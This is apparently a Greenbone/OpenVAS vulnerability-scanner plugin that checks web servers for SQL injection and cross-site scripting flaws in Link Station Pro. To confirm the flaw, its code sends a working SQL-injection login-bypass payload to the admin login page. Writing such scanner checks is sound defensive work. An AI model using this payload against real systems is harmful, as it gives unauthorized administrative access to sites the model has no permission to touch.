if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.801967" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2011-08-18 14:57:45 +0200 (Thu, 18 Aug 2011)" );
	script_bugtraq_id( 48948 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "Link Station Pro SQL Injection and Cross Site Scripting Vulnerabilities" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/45479/" );
	script_xref( name: "URL", value: "http://forums.cnet.com/7726-6132_102-5178348.html" );
	script_xref( name: "URL", value: "http://securityreason.com/wlb_show/WLB-2011080004" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/103582/linkstation-sqlxss.txt" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to cause SQL Injection
  attack or to execute arbitrary HTML and script code in a user's browser session
  in the context of an affected site." );
	script_tag( name: "affected", value: "Link Station Pro." );
	script_tag( name: "insight", value: "The flaws are due to improper validation of user-supplied input,

  - In 'Username' and 'Password' parameter to the 'index.php',

  - In 'AddNewCategory' and 'categoryname' parameter to the
  'manage_categories.php'" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "The host is running Link Station Pro and is prone to SQL
  injection and cross site scripting vulnerabilities." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/admin", "/link", "/linkstation", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	res = http_get_cache( item: dir + "/index.php", port: port );
	if(ContainsString( res, ">Link Station Pro Admin Management Login<" )){
		authVariables = "op=adminlogin&username=%27+or+%27bug%27%3D%27bug%27+" + "%23&password=%27+or+%27bug%27%3D%27bug%27+%23";
		req = NASLString( "POST ", dir, "/index.php HTTP/1.1\\r\\n", "Host: ", get_host_name(), "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( authVariables ), "\\r\\n\\r\\n", authVariables );
		res = http_keepalive_send_recv( port: port, data: req );
		if(ContainsString( res, ">You have now logged in to the Link Station Pro Admin Area<" )){
			security_message( port: port );
			exit( 0 );
		}
	}
}
exit( 99 );

